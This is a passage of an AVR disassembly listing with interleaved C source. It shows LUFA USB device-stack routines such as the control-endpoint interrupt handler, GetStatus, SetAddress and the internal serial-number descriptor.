    6d20:	0f 90       	pop	r0
    6d22:	0b be       	out	0x3b, r0	; 59
    6d24:	0f 90       	pop	r0
    6d26:	0f be       	out	0x3f, r0	; 63
    6d28:	0f 90       	pop	r0
    6d2a:	1f 90       	pop	r1
    6d2c:	18 95       	reti

00006d2e <__vector_11>:

#if defined(INTERRUPT_CONTROL_ENDPOINT) && defined(USB_CAN_BE_DEVICE)
ISR(USB_COM_vect, ISR_BLOCK)
{
    6d2e:	1f 92       	push	r1
    6d30:	0f 92       	push	r0
    6d32:	0f b6       	in	r0, 0x3f	; 63
    6d34:	0f 92       	push	r0
    6d36:	11 24       	eor	r1, r1
    6d38:	0b b6       	in	r0, 0x3b	; 59
    6d3a:	0f 92       	push	r0
    6d3c:	ef 92       	push	r14
    6d3e:	ff 92       	push	r15
    6d40:	1f 93       	push	r17
    6d42:	2f 93       	push	r18
    6d44:	3f 93       	push	r19
    6d46:	4f 93       	push	r20
    6d48:	5f 93       	push	r21
    6d4a:	6f 93       	push	r22
    6d4c:	7f 93       	push	r23
    6d4e:	8f 93       	push	r24
    6d50:	9f 93       	push	r25
    6d52:	af 93       	push	r26
    6d54:	bf 93       	push	r27
    6d56:	cf 93       	push	r28
    6d58:	df 93       	push	r29
    6d5a:	ef 93       	push	r30
    6d5c:	ff 93       	push	r31
			 */
			static inline uint8_t Endpoint_GetCurrentEndpoint(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_GetCurrentEndpoint(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					return ((UENUM & ENDPOINT_EPNUM_MASK) | Endpoint_GetEndpointDirection());
    6d5e:	c0 91 e9 00 	lds	r28, 0x00E9	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
    6d62:	cf 70       	andi	r28, 0x0F	; 15
			 *  \return The currently selected endpoint's direction, as a \c ENDPOINT_DIR_* mask.
			 */
			static inline uint8_t Endpoint_GetEndpointDirection(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_GetEndpointDirection(void)
			{
				return (UECFG0X & (1 << EPDIR)) ? ENDPOINT_DIR_IN : ENDPOINT_DIR_OUT;
    6d64:	80 91 ec 00 	lds	r24, 0x00EC	; 0x8000ec <__TEXT_REGION_LENGTH__+0x7e00ec>
    6d68:	98 2f       	mov	r25, r24
    6d6a:	91 70       	andi	r25, 0x01	; 1
    6d6c:	80 fd       	sbrc	r24, 0
    6d6e:	90 e8       	ldi	r25, 0x80	; 128
			 */
			static inline uint8_t Endpoint_GetCurrentEndpoint(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_GetCurrentEndpoint(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					return ((UENUM & ENDPOINT_EPNUM_MASK) | Endpoint_GetEndpointDirection());
    6d70:	19 2f       	mov	r17, r25
    6d72:	1c 2b       	or	r17, r28
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6d74:	0f 2e       	mov	r0, r31
    6d76:	f9 ee       	ldi	r31, 0xE9	; 233
    6d78:	ef 2e       	mov	r14, r31
    6d7a:	f1 2c       	mov	r15, r1
    6d7c:	f0 2d       	mov	r31, r0
    6d7e:	f7 01       	movw	r30, r14
    6d80:	10 82       	st	Z, r1
						break;
					case USB_INT_SOFI:
						UDIEN  &= ~(1 << SOFE);
						break;
					case USB_INT_RXSTPI:
						UEIENX &= ~(1 << RXSTPE);
    6d82:	c0 ef       	ldi	r28, 0xF0	; 240
    6d84:	d0 e0       	ldi	r29, 0x00	; 0
    6d86:	88 81       	ld	r24, Y
    6d88:	87 7f       	andi	r24, 0xF7	; 247
    6d8a:	88 83       	st	Y, r24
			static inline void GlobalInterruptEnable(void)
			{
				GCC_MEMORY_BARRIER();

				#if (ARCH == ARCH_AVR8)
				sei();
    6d8c:	78 94       	sei
	Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);
	USB_INT_Disable(USB_INT_RXSTPI);

	GlobalInterruptEnable();

	USB_Device_ProcessControlRequest();
    6d8e:	7f d1       	rcall	.+766    	; 0x708e <USB_Device_ProcessControlRequest>
    6d90:	f7 01       	movw	r30, r14
    6d92:	10 82       	st	Z, r1
						break;
					case USB_INT_SOFI:
						UDIEN  |= (1 << SOFE);
						break;
					case USB_INT_RXSTPI:
						UEIENX |= (1 << RXSTPE);
    6d94:	88 81       	ld	r24, Y
    6d96:	88 60       	ori	r24, 0x08	; 8
    6d98:	88 83       	st	Y, r24
    6d9a:	c1 2f       	mov	r28, r17
    6d9c:	cf 70       	andi	r28, 0x0F	; 15
    6d9e:	c0 83       	st	Z, r28

	Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);
	USB_INT_Enable(USB_INT_RXSTPI);
	Endpoint_SelectEndpoint(PrevSelectedEndpoint);
}
    6da0:	ff 91       	pop	r31
    6da2:	ef 91       	pop	r30
    6da4:	df 91       	pop	r29
    6da6:	cf 91       	pop	r28
    6da8:	bf 91       	pop	r27
    6daa:	af 91       	pop	r26
    6dac:	9f 91       	pop	r25
    6dae:	8f 91       	pop	r24
    6db0:	7f 91       	pop	r23
    6db2:	6f 91       	pop	r22
    6db4:	5f 91       	pop	r21
    6db6:	4f 91       	pop	r20
    6db8:	3f 91       	pop	r19
    6dba:	2f 91       	pop	r18
    6dbc:	1f 91       	pop	r17
    6dbe:	ff 90       	pop	r15
    6dc0:	ef 90       	pop	r14
    6dc2:	0f 90       	pop	r0
    6dc4:	0b be       	out	0x3b, r0	; 59
    6dc6:	0f 90       	pop	r0
    6dc8:	0f be       	out	0x3f, r0	; 63
    6dca:	0f 90       	pop	r0
    6dcc:	1f 90       	pop	r1
    6dce:	18 95       	reti

00006dd0 <USB_Device_GetStatus>:

static void USB_Device_GetStatus(void)
{
	uint8_t CurrentStatus = 0;

	switch (USB_ControlRequest.bmRequestType)
    6dd0:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    6dd4:	80 38       	cpi	r24, 0x80	; 128
    6dd6:	19 f0       	breq	.+6      	; 0x6dde <USB_Device_GetStatus+0xe>
    6dd8:	82 38       	cpi	r24, 0x82	; 130
    6dda:	71 f0       	breq	.+28     	; 0x6df8 <USB_Device_GetStatus+0x28>
    6ddc:	08 95       	ret
	{
		case (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_DEVICE):
		{
			#if !defined(NO_DEVICE_SELF_POWER)
			if (USB_Device_CurrentlySelfPowered)
    6dde:	80 91 f0 0d 	lds	r24, 0x0DF0	; 0x800df0 <USB_Device_CurrentlySelfPowered>
    6de2:	81 11       	cpse	r24, r1
    6de4:	02 c0       	rjmp	.+4      	; 0x6dea <USB_Device_GetStatus+0x1a>
	Endpoint_ClearOUT();
}

static void USB_Device_GetStatus(void)
{
	uint8_t CurrentStatus = 0;
    6de6:	90 e0       	ldi	r25, 0x00	; 0
    6de8:	01 c0       	rjmp	.+2      	; 0x6dec <USB_Device_GetStatus+0x1c>
	{
		case (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_DEVICE):
		{
			#if !defined(NO_DEVICE_SELF_POWER)
			if (USB_Device_CurrentlySelfPowered)
			  CurrentStatus |= FEATURE_SELFPOWERED_ENABLED;
    6dea:	91 e0       	ldi	r25, 0x01	; 1
			#endif

			#if !defined(NO_DEVICE_REMOTE_WAKEUP)
			if (USB_Device_RemoteWakeupEnabled)
    6dec:	80 91 f1 0d 	lds	r24, 0x0DF1	; 0x800df1 <USB_Device_RemoteWakeupEnabled>
    6df0:	88 23       	and	r24, r24
    6df2:	81 f0       	breq	.+32     	; 0x6e14 <USB_Device_GetStatus+0x44>
			  CurrentStatus |= FEATURE_REMOTE_WAKEUP_ENABLED;
    6df4:	92 60       	ori	r25, 0x02	; 2
    6df6:	0e c0       	rjmp	.+28     	; 0x6e14 <USB_Device_GetStatus+0x44>
			break;
		}
		case (REQDIR_DEVICETOHOST | REQTYPE_STANDARD | REQREC_ENDPOINT):
		{
			#if !defined(CONTROL_ONLY_DEVICE)
			uint8_t EndpointIndex = ((uint8_t)USB_ControlRequest.wIndex & ENDPOINT_EPNUM_MASK);
    6df8:	80 91 f8 0d 	lds	r24, 0x0DF8	; 0x800df8 <USB_ControlRequest+0x4>
    6dfc:	8f 70       	andi	r24, 0x0F	; 15

			if (EndpointIndex >= ENDPOINT_TOTAL_ENDPOINTS)
    6dfe:	87 30       	cpi	r24, 0x07	; 7
    6e00:	b0 f4       	brcc	.+44     	; 0x6e2e <USB_Device_GetStatus+0x5e>
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6e02:	e9 ee       	ldi	r30, 0xE9	; 233
    6e04:	f0 e0       	ldi	r31, 0x00	; 0
    6e06:	80 83       	st	Z, r24
			 *  \return Boolean \c true if the currently selected endpoint is stalled, \c false otherwise.
			 */
			static inline bool Endpoint_IsStalled(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsStalled(void)
			{
				return ((UECONX & (1 << STALLRQ)) ? true : false);
    6e08:	90 91 eb 00 	lds	r25, 0x00EB	; 0x8000eb <__TEXT_REGION_LENGTH__+0x7e00eb>
    6e0c:	95 fb       	bst	r25, 5
    6e0e:	99 27       	eor	r25, r25
    6e10:	90 f9       	bld	r25, 0
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6e12:	10 82       	st	Z, r1
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    6e14:	e8 ee       	ldi	r30, 0xE8	; 232
    6e16:	f0 e0       	ldi	r31, 0x00	; 0
    6e18:	80 81       	ld	r24, Z
    6e1a:	87 7f       	andi	r24, 0xF7	; 247
    6e1c:	80 83       	st	Z, r24
			 *  \param[in] Data  Data to write to the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_16_LE(const uint16_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_16_LE(const uint16_t Data)
			{
				UEDATX = (Data & 0xFF);
    6e1e:	a1 ef       	ldi	r26, 0xF1	; 241
    6e20:	b0 e0       	ldi	r27, 0x00	; 0
    6e22:	9c 93       	st	X, r25
				UEDATX = (Data >> 8);
    6e24:	1c 92       	st	X, r1
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    6e26:	80 81       	ld	r24, Z
    6e28:	8e 77       	andi	r24, 0x7E	; 126
    6e2a:	80 83       	st	Z, r24
	Endpoint_ClearSETUP();

	Endpoint_Write_16_LE(CurrentStatus);
	Endpoint_ClearIN();

	Endpoint_ClearStatusStage();
    6e2c:	f6 cd       	rjmp	.-1044   	; 0x6a1a <Endpoint_ClearStatusStage>
    6e2e:	08 95       	ret

00006e30 <USB_Device_ClearSetFeature>:
}

static void USB_Device_ClearSetFeature(void)
{
	switch (USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_RECIPIENT)
    6e30:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    6e34:	8f 71       	andi	r24, 0x1F	; 31
    6e36:	19 f0       	breq	.+6      	; 0x6e3e <USB_Device_ClearSetFeature+0xe>
    6e38:	82 30       	cpi	r24, 0x02	; 2
    6e3a:	71 f0       	breq	.+28     	; 0x6e58 <USB_Device_ClearSetFeature+0x28>
    6e3c:	08 95       	ret
	{
		#if !defined(NO_DEVICE_REMOTE_WAKEUP)
		case REQREC_DEVICE:
		{
			if ((uint8_t)USB_ControlRequest.wValue == FEATURE_SEL_DeviceRemoteWakeup)
    6e3e:	80 91 f6 0d 	lds	r24, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    6e42:	81 30       	cpi	r24, 0x01	; 1
    6e44:	09 f0       	breq	.+2      	; 0x6e48 <USB_Device_ClearSetFeature+0x18>
    6e46:	3f c0       	rjmp	.+126    	; 0x6ec6 <USB_Device_ClearSetFeature+0x96>
			  USB_Device_RemoteWakeupEnabled = (USB_ControlRequest.bRequest == REQ_SetFeature);
    6e48:	90 91 f5 0d 	lds	r25, 0x0DF5	; 0x800df5 <USB_ControlRequest+0x1>
    6e4c:	93 30       	cpi	r25, 0x03	; 3
    6e4e:	09 f0       	breq	.+2      	; 0x6e52 <USB_Device_ClearSetFeature+0x22>
    6e50:	80 e0       	ldi	r24, 0x00	; 0
    6e52:	80 93 f1 0d 	sts	0x0DF1, r24	; 0x800df1 <USB_Device_RemoteWakeupEnabled>
			else
			  return;

			break;
    6e56:	2f c0       	rjmp	.+94     	; 0x6eb6 <USB_Device_ClearSetFeature+0x86>
		}
		#endif
		#if !defined(CONTROL_ONLY_DEVICE)
		case REQREC_ENDPOINT:
		{
			if ((uint8_t)USB_ControlRequest.wValue == FEATURE_SEL_EndpointHalt)
    6e58:	80 91 f6 0d 	lds	r24, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    6e5c:	81 11       	cpse	r24, r1
    6e5e:	2b c0       	rjmp	.+86     	; 0x6eb6 <USB_Device_ClearSetFeature+0x86>
			{
				uint8_t EndpointIndex = ((uint8_t)USB_ControlRequest.wIndex & ENDPOINT_EPNUM_MASK);
    6e60:	80 91 f8 0d 	lds	r24, 0x0DF8	; 0x800df8 <USB_ControlRequest+0x4>
    6e64:	8f 70       	andi	r24, 0x0F	; 15

				if (EndpointIndex == ENDPOINT_CONTROLEP || EndpointIndex >= ENDPOINT_TOTAL_ENDPOINTS)
    6e66:	9f ef       	ldi	r25, 0xFF	; 255
    6e68:	98 0f       	add	r25, r24
    6e6a:	96 30       	cpi	r25, 0x06	; 6
    6e6c:	60 f5       	brcc	.+88     	; 0x6ec6 <USB_Device_ClearSetFeature+0x96>
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6e6e:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
			 * \return Boolean \c true if the currently selected endpoint is enabled, \c false otherwise.
			 */
			static inline bool Endpoint_IsEnabled(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsEnabled(void)
			{
				return ((UECONX & (1 << EPEN)) ? true : false);
    6e72:	90 91 eb 00 	lds	r25, 0x00EB	; 0x8000eb <__TEXT_REGION_LENGTH__+0x7e00eb>
				  return;

				Endpoint_SelectEndpoint(EndpointIndex);

				if (Endpoint_IsEnabled())
    6e76:	90 ff       	sbrs	r25, 0
    6e78:	1e c0       	rjmp	.+60     	; 0x6eb6 <USB_Device_ClearSetFeature+0x86>
				{
					if (USB_ControlRequest.bRequest == REQ_SetFeature)
    6e7a:	90 91 f5 0d 	lds	r25, 0x0DF5	; 0x800df5 <USB_ControlRequest+0x1>
    6e7e:	93 30       	cpi	r25, 0x03	; 3
    6e80:	31 f4       	brne	.+12     	; 0x6e8e <USB_Device_ClearSetFeature+0x5e>
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_StallTransaction(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_StallTransaction(void)
			{
				UECONX |= (1 << STALLRQ);
    6e82:	eb ee       	ldi	r30, 0xEB	; 235
    6e84:	f0 e0       	ldi	r31, 0x00	; 0
    6e86:	80 81       	ld	r24, Z
    6e88:	80 62       	ori	r24, 0x20	; 32
    6e8a:	80 83       	st	Z, r24
    6e8c:	14 c0       	rjmp	.+40     	; 0x6eb6 <USB_Device_ClearSetFeature+0x86>
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_ClearStall(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearStall(void)
			{
				UECONX |= (1 << STALLRQC);
    6e8e:	eb ee       	ldi	r30, 0xEB	; 235
    6e90:	f0 e0       	ldi	r31, 0x00	; 0
    6e92:	90 81       	ld	r25, Z
    6e94:	90 61       	ori	r25, 0x10	; 16
    6e96:	90 83       	st	Z, r25
			 *  \param[in] Address  Endpoint address whose FIFO buffers are to be reset.
			 */
			static inline void Endpoint_ResetEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ResetEndpoint(const uint8_t Address)
			{
				UERST = (1 << (Address & ENDPOINT_EPNUM_MASK));
    6e98:	21 e0       	ldi	r18, 0x01	; 1
    6e9a:	30 e0       	ldi	r19, 0x00	; 0
    6e9c:	a9 01       	movw	r20, r18
    6e9e:	02 c0       	rjmp	.+4      	; 0x6ea4 <USB_Device_ClearSetFeature+0x74>
    6ea0:	44 0f       	add	r20, r20
    6ea2:	55 1f       	adc	r21, r21
    6ea4:	8a 95       	dec	r24
    6ea6:	e2 f7       	brpl	.-8      	; 0x6ea0 <USB_Device_ClearSetFeature+0x70>
    6ea8:	aa ee       	ldi	r26, 0xEA	; 234
    6eaa:	b0 e0       	ldi	r27, 0x00	; 0
    6eac:	4c 93       	st	X, r20
				UERST = 0;
    6eae:	1c 92       	st	X, r1

			/** Resets the data toggle of the currently selected endpoint. */
			static inline void Endpoint_ResetDataToggle(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ResetDataToggle(void)
			{
				UECONX |= (1 << RSTDT);
    6eb0:	80 81       	ld	r24, Z
    6eb2:	88 60       	ori	r24, 0x08	; 8
    6eb4:	80 83       	st	Z, r24
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6eb6:	10 92 e9 00 	sts	0x00E9, r1	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    6eba:	e8 ee       	ldi	r30, 0xE8	; 232
    6ebc:	f0 e0       	ldi	r31, 0x00	; 0
    6ebe:	80 81       	ld	r24, Z
    6ec0:	87 7f       	andi	r24, 0xF7	; 247
    6ec2:	80 83       	st	Z, r24

	Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);

	Endpoint_ClearSETUP();

	Endpoint_ClearStatusStage();
    6ec4:	aa cd       	rjmp	.-1196   	; 0x6a1a <Endpoint_ClearStatusStage>
    6ec6:	08 95       	ret

00006ec8 <USB_Device_SetAddress>:
		Endpoint_StallTransaction();
	}
}

static void USB_Device_SetAddress(void)
{
    6ec8:	cf 93       	push	r28
	uint8_t DeviceAddress = (USB_ControlRequest.wValue & 0x7F);
    6eca:	c0 91 f6 0d 	lds	r28, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    6ece:	cf 77       	andi	r28, 0x7F	; 127
			#endif

			static inline void USB_Device_SetDeviceAddress(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void USB_Device_SetDeviceAddress(const uint8_t Address)
			{
				UDADDR = (UDADDR & (1 << ADDEN)) | (Address & 0x7F);
    6ed0:	e3 ee       	ldi	r30, 0xE3	; 227
    6ed2:	f0 e0       	ldi	r31, 0x00	; 0
    6ed4:	80 81       	ld	r24, Z
    6ed6:	80 78       	andi	r24, 0x80	; 128
    6ed8:	8c 2b       	or	r24, r28
    6eda:	80 83       	st	Z, r24
    6edc:	e8 ee       	ldi	r30, 0xE8	; 232
    6ede:	f0 e0       	ldi	r31, 0x00	; 0
    6ee0:	80 81       	ld	r24, Z
    6ee2:	87 7f       	andi	r24, 0xF7	; 247
    6ee4:	80 83       	st	Z, r24

	USB_Device_SetDeviceAddress(DeviceAddress);

	Endpoint_ClearSETUP();

	Endpoint_ClearStatusStage();
    6ee6:	99 dd       	rcall	.-1230   	; 0x6a1a <Endpoint_ClearStatusStage>
			 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsINReady(void)
			{
				return ((UEINTX & (1 << TXINI)) ? true : false);
    6ee8:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

	while (!(Endpoint_IsINReady()));
    6eec:	80 ff       	sbrs	r24, 0
    6eee:	fc cf       	rjmp	.-8      	; 0x6ee8 <USB_Device_SetAddress+0x20>
			static inline void USB_Device_EnableDeviceAddress(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void USB_Device_EnableDeviceAddress(const uint8_t Address)
			{
				(void)Address;

				UDADDR |= (1 << ADDEN);
    6ef0:	e3 ee       	ldi	r30, 0xE3	; 227
    6ef2:	f0 e0       	ldi	r31, 0x00	; 0
    6ef4:	80 81       	ld	r24, Z
    6ef6:	80 68       	ori	r24, 0x80	; 128
    6ef8:	80 83       	st	Z, r24

	USB_Device_EnableDeviceAddress(DeviceAddress);

	USB_DeviceState = (DeviceAddress) ? DEVICE_STATE_Addressed : DEVICE_STATE_Default;
    6efa:	cc 23       	and	r28, r28
    6efc:	11 f0       	breq	.+4      	; 0x6f02 <USB_Device_SetAddress+0x3a>
    6efe:	83 e0       	ldi	r24, 0x03	; 3
    6f00:	01 c0       	rjmp	.+2      	; 0x6f04 <USB_Device_SetAddress+0x3c>
    6f02:	82 e0       	ldi	r24, 0x02	; 2
    6f04:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>
}
    6f08:	cf 91       	pop	r28
    6f0a:	08 95       	ret

00006f0c <USB_Device_GetConfiguration>:
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    6f0c:	e8 ee       	ldi	r30, 0xE8	; 232
    6f0e:	f0 e0       	ldi	r31, 0x00	; 0
    6f10:	80 81       	ld	r24, Z
    6f12:	87 7f       	andi	r24, 0xF7	; 247
    6f14:	80 83       	st	Z, r24

static void USB_Device_GetConfiguration(void)
{
	Endpoint_ClearSETUP();

	Endpoint_Write_8(USB_Device_ConfigurationNumber);
    6f16:	80 91 ef 0d 	lds	r24, 0x0DEF	; 0x800def <USB_Device_ConfigurationNumber>
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    6f1a:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    6f1e:	80 81       	ld	r24, Z
    6f20:	8e 77       	andi	r24, 0x7E	; 126
    6f22:	80 83       	st	Z, r24
	Endpoint_ClearIN();

	Endpoint_ClearStatusStage();
    6f24:	7a cd       	rjmp	.-1292   	; 0x6a1a <Endpoint_ClearStatusStage>
    6f26:	08 95       	ret

00006f28 <USB_Device_GetInternalSerialDescriptor>:

extern void(*LUFA_DREG_HOOK_INTERNAL_SERIAL)(uint16_t* serial_str, size_t nr_elements);

#if !defined(NO_INTERNAL_SERIAL) && (USE_INTERNAL_SERIAL != NO_DESCRIPTOR)
static void USB_Device_GetInternalSerialDescriptor(void)
{
    6f28:	0f 93       	push	r16
    6f2a:	1f 93       	push	r17
    6f2c:	cf 93       	push	r28
    6f2e:	df 93       	push	r29
    6f30:	cd b7       	in	r28, 0x3d	; 61
    6f32:	de b7       	in	r29, 0x3e	; 62
    6f34:	aa 97       	sbiw	r28, 0x2a	; 42
    6f36:	0f b6       	in	r0, 0x3f	; 63
    6f38:	f8 94       	cli
    6f3a:	de bf       	out	0x3e, r29	; 62
    6f3c:	0f be       	out	0x3f, r0	; 63
    6f3e:	cd bf       	out	0x3d, r28	; 61
    {
        USB_Descriptor_Header_t Header;
        uint16_t                UnicodeString[INTERNAL_SERIAL_LENGTH_BITS / 4];
    } SignatureDescriptor;

    SignatureDescriptor.Header.Type = DTYPE_String;
    6f40:	83 e0       	ldi	r24, 0x03	; 3
    6f42:	8a 83       	std	Y+2, r24	; 0x02
    SignatureDescriptor.Header.Size = USB_STRING_LEN(INTERNAL_SERIAL_LENGTH_BITS / 4);
    6f44:	8a e2       	ldi	r24, 0x2A	; 42
    6f46:	89 83       	std	Y+1, r24	; 0x01
			static inline uint_reg_t GetGlobalInterruptMask(void)
			{
				GCC_MEMORY_BARRIER();

				#if (ARCH == ARCH_AVR8)
				return SREG;
    6f48:	3f b7       	in	r19, 0x3f	; 63
			static inline void GlobalInterruptDisable(void)
			{
				GCC_MEMORY_BARRIER();

				#if (ARCH == ARCH_AVR8)
				cli();
    6f4a:	f8 94       	cli
				uint_reg_t CurrentGlobalInt = GetGlobalInterruptMask();
				GlobalInterruptDisable();

				uint8_t SigReadAddress = INTERNAL_SERIAL_START_ADDRESS;

				for (uint8_t SerialCharNum = 0; SerialCharNum < (INTERNAL_SERIAL_LENGTH_BITS / 4); SerialCharNum++)
    6f4c:	90 e0       	ldi	r25, 0x00	; 0
			static inline void USB_Device_GetSerialString(uint16_t* const UnicodeString)
			{
				uint_reg_t CurrentGlobalInt = GetGlobalInterruptMask();
				GlobalInterruptDisable();

				uint8_t SigReadAddress = INTERNAL_SERIAL_START_ADDRESS;
    6f4e:	2e e0       	ldi	r18, 0x0E	; 14
    6f50:	20 c0       	rjmp	.+64     	; 0x6f92 <USB_Device_GetInternalSerialDescriptor+0x6a>

				for (uint8_t SerialCharNum = 0; SerialCharNum < (INTERNAL_SERIAL_LENGTH_BITS / 4); SerialCharNum++)
				{
					uint8_t SerialByte = boot_signature_byte_get(SigReadAddress);
    6f52:	e2 2f       	mov	r30, r18
    6f54:	f0 e0       	ldi	r31, 0x00	; 0
    6f56:	81 e2       	ldi	r24, 0x21	; 33
    6f58:	80 93 57 00 	sts	0x0057, r24	; 0x800057 <__TEXT_REGION_LENGTH__+0x7e0057>
    6f5c:	e4 91       	lpm	r30, Z

					if (SerialCharNum & 0x01)
    6f5e:	90 ff       	sbrs	r25, 0
    6f60:	03 c0       	rjmp	.+6      	; 0x6f68 <USB_Device_GetInternalSerialDescriptor+0x40>
					{
						SerialByte >>= 4;
    6f62:	e2 95       	swap	r30
    6f64:	ef 70       	andi	r30, 0x0F	; 15
						SigReadAddress++;
    6f66:	2f 5f       	subi	r18, 0xFF	; 255
					}

					SerialByte &= 0x0F;
    6f68:	ef 70       	andi	r30, 0x0F	; 15

					UnicodeString[SerialCharNum] = cpu_to_le16((SerialByte >= 10) ?
    6f6a:	a9 2f       	mov	r26, r25
    6f6c:	b0 e0       	ldi	r27, 0x00	; 0
    6f6e:	aa 0f       	add	r26, r26
    6f70:	bb 1f       	adc	r27, r27
    6f72:	43 e0       	ldi	r20, 0x03	; 3
    6f74:	50 e0       	ldi	r21, 0x00	; 0
    6f76:	4c 0f       	add	r20, r28
    6f78:	5d 1f       	adc	r21, r29
    6f7a:	a4 0f       	add	r26, r20
    6f7c:	b5 1f       	adc	r27, r21
    6f7e:	ea 30       	cpi	r30, 0x0A	; 10
    6f80:	18 f0       	brcs	.+6      	; 0x6f88 <USB_Device_GetInternalSerialDescriptor+0x60>
    6f82:	f0 e0       	ldi	r31, 0x00	; 0
    6f84:	f7 96       	adiw	r30, 0x37	; 55
    6f86:	02 c0       	rjmp	.+4      	; 0x6f8c <USB_Device_GetInternalSerialDescriptor+0x64>
    6f88:	f0 e0       	ldi	r31, 0x00	; 0
    6f8a:	f0 96       	adiw	r30, 0x30	; 48
    6f8c:	ed 93       	st	X+, r30
    6f8e:	fc 93       	st	X, r31
				uint_reg_t CurrentGlobalInt = GetGlobalInterruptMask();
				GlobalInterruptDisable();

				uint8_t SigReadAddress = INTERNAL_SERIAL_START_ADDRESS;

				for (uint8_t SerialCharNum = 0; SerialCharNum < (INTERNAL_SERIAL_LENGTH_BITS / 4); SerialCharNum++)
    6f90:	9f 5f       	subi	r25, 0xFF	; 255
    6f92:	94 31       	cpi	r25, 0x14	; 20
    6f94:	f0 f2       	brcs	.-68     	; 0x6f52 <USB_Device_GetInternalSerialDescriptor+0x2a>
			static inline void SetGlobalInterruptMask(const uint_reg_t GlobalIntState)
			{
